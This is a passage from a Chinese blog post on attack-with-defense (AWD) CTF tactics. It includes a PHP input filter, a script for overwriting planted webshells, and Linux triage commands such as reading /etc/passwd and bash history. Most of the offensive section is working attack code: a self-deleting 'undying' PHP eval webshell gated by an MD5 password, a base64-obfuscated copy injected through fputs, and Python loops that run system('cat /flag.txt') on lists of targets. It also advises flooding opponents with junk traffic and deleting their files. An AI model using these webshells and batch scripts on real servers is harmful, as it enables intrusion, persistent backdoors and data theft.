function\">DefendAttack</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$StrFiltKey</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$StrFiltValue</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ArrFiltReq</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$StrFiltValue</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$StrFiltValue</span> <span class=\"token operator\">=</span> <span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$StrFiltValue</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$ArrFiltReq</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/is\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$StrFiltValue</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token comment\">//slog (\"&lt;br>&lt;br > 操作 IP:\".$_SERVER [\"REMOTE_ADDR\"].\"&lt;br > 操作时间:\".strftime (\"% Y-% m-% d % H:% M:% S\").\"&lt;br > 操作页面:\".$_SERVER [\"PHP_SELF\"].\"&lt;br > 提交方式:\".$_SERVER [\"REQUEST_METHOD\"].\"&lt;br > 提交参数:\".$StrFiltKey.\"&lt;br > 提交参数:\".$StrFiltValue);</span>\n\t\t<span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"360WebSec notice: Illegal operation!\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//$ArrPGC = array_merge($_GET, $_POST, $_COOKIE);</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">DefendAttack</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$getfilter</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">DefendAttack</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$postfilter</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">DefendAttack</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$cookiefilter</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token comment\"># code...</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">slog</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$logs</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$toppath</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"DOCUMENT_ROOT\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/log.htm\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$Ts</span><span class=\"token operator\">=</span><span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$toppath</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"a+\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fputs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$Ts</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$logs</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$Ts</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>对于别人上传过来的不死马进行处理</p>\n<ul>\n<li>杀死进程，可以使用 ps aux 命令 列出所有进程，找到要杀掉的进程运用命令，kill pid 就可以了</li>\n<li>通过条件竞争写入无效内容或者删除不死马文件，代码如下（竞争写入无关内容，config 是木马名）</li>\n</ul>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token function\">ignore_user_abort</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">set_time_limit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'.config.php'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'???'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//pass=pass</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'touch -m -d \"2018-12-01 09:10:12\" .config.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">usleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>当然最好的防御还是攻击</p>\n<h2 id=\"利用漏洞攻击\"><a class=\"anchor\" href=\"#利用漏洞攻击\">#</a> 利用漏洞攻击</h2>\n<p>d 盾扫出来的 shell 只要手快还是可以先打一波的，可以在赛前提前写好简单的 shell 利用批量化脚本</p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> fontTools<span class=\"token punctuation\">.</span>afmLib\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> json\n<span class=\"token keyword\">import</span> re\n\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"url.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> url1<span class=\"token punctuation\">:</span>\n    data<span class=\"token operator\">=</span>url1<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\npaylaod2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">&#125;</span>\nheader2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">\"token\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"Cookie\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">#平台 url</span>\nurl2 <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span>\n        urlpro<span class=\"token operator\">=</span><span class=\"token string\">\"http://&#123;&#125;/.a.php?c=system('cat /flag.txt');\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        res<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>urlpro<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(urlpro)</span>\n        p<span class=\"token operator\">=</span>re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag.*&#125;\"</span><span class=\"token punctuation\">)</span>\n        a<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n        paylaod2<span class=\"token punctuation\">[</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a\n        <span class=\"token comment\"># print(paylaod2)</span>\n        <span class=\"token comment\"># post 请求</span>\n        res2 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url2<span class=\"token punctuation\">,</span> paylaod2<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>header2<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>当然这样可能只能拿到一轮的分数，所以我们可以上传不死马，下面是一个常用的 MD5 不死马</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token function\">ignore_user_abort</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 设置与客户机断开是否会终止脚本的执行，这里设置为 true 则忽略与用户的断开，即使与客户机断开脚本仍会执行。</span>\n    <span class=\"token function\">set_time_limit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 设置脚本最大执行时间，这里设置为 0，即没有时间方面的限制</span>\n    <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 删除文件本身，以起到隐蔽自身的作用</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'.config.php'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'&lt;?php if(md5($_GET[\"pass\"])==\"1a1dc91c907325c69271ddf0c944bc72\")&#123;@eval($_POST[xcu]);&#125; ?>'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//pass=pass</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'touch -m -d \"2018-12-01 09:10:12\" .config2.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'chmod 777 .config.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">usleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//while 循环中每隔 usleep (0) 即写新的后门文件，system 命令用于修改文件的创建时间或修改时间，因为在 AWD 比赛中有的队伍使用</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> time\n\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> json\n\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"url.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n    data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n\n\nnodie <span class=\"token operator\">=</span> <span class=\"token string\">\"PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwokZmlsZT0iLmNvbmZpZzEucGhwIjsKJHNoZWxsPSJQRDl3YUhBZ0pHWmtlVUk5WTNKbFlYUmxYMloxYm1OMGFXOXVLSE4wY2w5eWIzUXhNeWduSkNjcExtSmhjMlUyTkY5a1pXTnZaR1VvSjJOM1BUMG5LUzV6ZEhKZmNtOTBNVE1vSjJJbktTNWphSElvTUhnMlpqaGxMekI0TVRBMktTNWlZWE5sTmpSZlpHVmpiMlJsS0NkYVVUMDlKeWtzWTJoeUtEQjRNVFpqWmpFdk1IZ3pPV1FwTG1Ob2NpZ3hNRFk1TURndk9UQTJLUzVpWVhObE5qUmZaR1ZqYjJSbEtDZFpVVDA5SnlrdVkyaHlLREF5TXpZMU1EQXZNREV6TmpBcExuTjBjbDl5YjNReE15Z25LQ2NwTG1Ob2NpZ3dNVEEwTnkwd01UQXdNeWt1YzNSeVgzSnZkREV6S0NkbUp5a3VjM1J5WDNKdmRERXpLQ2RpSnlrdVltRnpaVFkwWDJSbFkyOWtaU2duWWxFOVBTY3BMbUpoYzJVMk5GOWtaV052WkdVb0oxcFJQVDBuS1M1aVlYTmxOalJmWkdWamIyUmxLQ2RMVVQwOUp5a3VjM1J5WDNKdmRERXpLQ2M3SnlrcE95Um1aSGxDS0dKaGMyVTJORjlrWldOdlpHVW9KMDFVVFRKTkp5NG5lbU4zVHpBbkxpZENiR1JyUmljdUozTkxRMUptSnk0bkp5NWphSElvTURFek5USXRNREV5TWpVcExtTm9jaWcyT0RNeE1DODVPVEFwTG1Ob2NpZ3dlR05qT1dZdk1IZ3pPVGNwTG1KaGMyVTJORjlrWldOdlpHVW9KMVpCUFQwbktTNXpkSEpmY205ME1UTW9KMGtuS1M0bkp5NG5KeTVqYUhJb09EQTNMVGN6TnlrdWMzUnlYM0p2ZERFektDZG5KeWt1WTJoeUtEVXdOVFEwTHprM01pa3VZMmh5S0RCNE16Rm1MVEI0TW1NMktTNWphSElvTURjME5EUXdMekF4TVRRd0tTNG5KeTRuVm1STFZITW5MaWN3VFVScmVDY3VKMDFVUVRjbkxpY25LU2s3UHo0PSI7CndoaWxlKDEpCntmaWxlX3B1dF9jb250ZW50cygkZmlsZSxiYXNlNjRfZGVjb2RlKCRzaGVsbCkpOwogICAgc3lzdGVtKCdjaG1vZCA3NzcgLmNvbmZpZy5waHAnKTsKICAgIHRvdWNoKCIuY29uZmlnLnBocCIpOwogICAgdXNsZWVwKDUwKTt9Owo=\"</span>\npoc <span class=\"token operator\">=</span> <span class=\"token string\">\"fputs(fopen('/var/www/html/nodie.php','w'),base64_decode('PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwokZmlsZT0iLmNvbmZpZzEucGhwIjsKJHNoZWxsPSJQRDl3YUhBZ0pHWmtlVUk5WTNKbFlYUmxYMloxYm1OMGFXOXVLSE4wY2w5eWIzUXhNeWduSkNjcExtSmhjMlUyTkY5a1pXTnZaR1VvSjJOM1BUMG5LUzV6ZEhKZmNtOTBNVE1vSjJJbktTNWphSElvTUhnMlpqaGxMekI0TVRBMktTNWlZWE5sTmpSZlpHVmpiMlJsS0NkYVVUMDlKeWtzWTJoeUtEQjRNVFpqWmpFdk1IZ3pPV1FwTG1Ob2NpZ3hNRFk1TURndk9UQTJLUzVpWVhObE5qUmZaR1ZqYjJSbEtDZFpVVDA5SnlrdVkyaHlLREF5TXpZMU1EQXZNREV6TmpBcExuTjBjbDl5YjNReE15Z25LQ2NwTG1Ob2NpZ3dNVEEwTnkwd01UQXdNeWt1YzNSeVgzSnZkREV6S0NkbUp5a3VjM1J5WDNKdmRERXpLQ2RpSnlrdVltRnpaVFkwWDJSbFkyOWtaU2duWWxFOVBTY3BMbUpoYzJVMk5GOWtaV052WkdVb0oxcFJQVDBuS1M1aVlYTmxOalJmWkdWamIyUmxLQ2RMVVQwOUp5a3VjM1J5WDNKdmRERXpLQ2M3SnlrcE95Um1aSGxDS0dKaGMyVTJORjlrWldOdlpHVW9KMDFVVFRKTkp5NG5lbU4zVHpBbkxpZENiR1JyUmljdUozTkxRMUptSnk0bkp5NWphSElvTURFek5USXRNREV5TWpVcExtTm9jaWcyT0RNeE1DODVPVEFwTG1Ob2NpZ3dlR05qT1dZdk1IZ3pPVGNwTG1KaGMyVTJORjlrWldOdlpHVW9KMVpCUFQwbktTNXpkSEpmY205ME1UTW9KMGtuS1M0bkp5NG5KeTVqYUhJb09EQTNMVGN6TnlrdWMzUnlYM0p2ZERFektDZG5KeWt1WTJoeUtEVXdOVFEwTHprM01pa3VZMmh5S0RCNE16Rm1MVEI0TW1NMktTNWphSElvTURjME5EUXdMekF4TVRRd0tTNG5KeTRuVm1STFZITW5MaWN3VFVScmVDY3VKMDFVUVRjbkxpY25LU2s3UHo0PSI7CndoaWxlKDEpCntmaWxlX3B1dF9jb250ZW50cygkZmlsZSxiYXNlNjRfZGVjb2RlKCRzaGVsbCkpOwogICAgc3lzdGVtKCdjaG1vZCA3NzcgLmNvbmZpZy5waHAnKTsKICAgIHRvdWNoKCIuY29uZmlnLnBocCIpOwogICAgdXNsZWVwKDUwKTt9Owo='));\"</span>\n\nheader2<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"token\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n         <span class=\"token string\">\"Cookie\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">#提交 flag</span>\nurl4<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\n\npayload2<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">&#125;</span>\npayload3<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"xcu\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"system('cat /flag.txt');\"</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span>\n        <span class=\"token comment\">#执行命令</span>\n        url1 <span class=\"token operator\">=</span> <span class=\"token string\">\"http://&#123;&#125;?a=\"</span><span class=\"token operator\">+</span>poc<span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(url1)</span>\n        res1 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url1<span class=\"token punctuation\">)</span>\n        url2 <span class=\"token operator\">=</span> <span class=\"token string\">\"http://&#123;&#125;/nodie.php\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(url2)</span>\n        res2 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url2<span class=\"token punctuation\">)</span>\n        url3 <span class=\"token operator\">=</span> <span class=\"token string\">\"http://&#123;&#125;/.config1.php\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(url3)</span>\n        res3 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url3<span class=\"token punctuation\">,</span>payload3<span class=\"token punctuation\">)</span>\n        p <span class=\"token operator\">=</span> res3<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag.*&#125;\"</span><span class=\"token punctuation\">)</span>\n        a <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(a)</span>\n        <span class=\"token comment\"># 将 a 存入 paylaod2 中</span>\n        paylaod2<span class=\"token punctuation\">[</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a\n        <span class=\"token comment\">#time.sleep(1)</span>\n        <span class=\"token comment\"># print(paylaod2)</span>\n        <span class=\"token comment\"># post 请求</span>\n        res2 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url4<span class=\"token punctuation\">,</span> paylaod2<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>header2<span class=\"token punctuation\">)</span>\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>防护常见命令</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">1 ssh &lt;-p 端口&gt; username@ip\n\n2 scp 文件路径 username@ip:存放路径\n\n3 cat &#x2F;root&#x2F;.bash_history\n\n4 #显示最近登录的5个帐号\n\n5 last -n 5|awk &#39;&#123;print $1&#125;&#39;\n\n6 #显示&#x2F;etc&#x2F;passwd的账户\n\n7 cat &#x2F;etc&#x2F;passwd|awk -F &#39;:&#39; &#39;&#123;print $1&#125;&#39;\n\n8 #查看UID为0的帐号\n\n9 awk -F: &#39;&#123;if($3&#x3D;&#x3D;0)print $1&#125;&#39; &#x2F;etc&#x2F;passwd10 #查找777的权限的文件\n\n11 find . -name &quot;*.php&quot; -perm 4777\n\n12 #查找24小时内被修改的PHP文件\n\n13 find .&#x2F; -mtime 0 -name &quot;*.php&quot;\n\n14 #查看进程\n\n15 ps aux | grep pid或者进程名\n\n16 #查看已建立的网络连接及进程\n\n17 netstat -antulp | grep EST\n\n18 #查看指定端口被哪个进程占用\n\n19 lsof -i:端口号 或者 netstat -tunlp|grep 端口号\n\n20 #结束进程命令\n\n21 kill PID\n\n22 killall &lt;进程名&gt;\n\n23 pkill &lt;进程名&gt;\n\n24 pkill -u用户名\n\n25 #封杀某个IP或者ip段\n\n26 iptables -I INPUT -s source_ip[&#x2F;mask] -j DROP\n\n27 #禁止从某个主机ssh远程访问登陆到本机\n\n28 iptable -t filter -A INPUT -s source_ip[&#x2F;mask] -p tcp --dport 22 -j DROP\n\n29 #备份mysql数据库\n\n30 mysqldump -u 用户名 -p 密码 数据库名 &gt; bak.sql\n\n31 mysqldump --all-databases &gt; bak.sql\n\n32 #还原mysql数据库\n\n33 mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql\n\n34 #定时任务，在固定的时间间隔执行指定的系统指令或shell script\n\n35 crontab [-u user] file_name\n\n36 crontab [-u user] [-e |-l| -r]\n\n37 #检测所有的tcp连接数量及状态\n\n38 netstat -ant|awk|grep|sed -e -e|sort|uniq -c|sort -rn\n\n39 #查看页面访问排名前十的IP\n\n40 cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log|cut -f1 -d|sort|uniq -c|sort -k -r|head -\n\n41 #查看页面访问排名前十的URL\n\n42 cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log|cut -f4 -d|sort|uniq -c|sort -k -r|head -<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"最后\"><a class=\"anchor\" href=\"#最后\">#</a> 最后</h2>\n<p>是要做一名合格的搅屎棍</p>\n<p>恶心别人，核心就是发送大量垃圾数据包给别人 ，让别人无法正常观察流量捕捉 payload ，此招就是干扰对手利用他人的 payload 给对手造成干扰。但是有些比赛可能也会禁止。</p>\n<p>我们拿到 shell 后在规则允许的情况我们可以删除别人的文件，别人 check 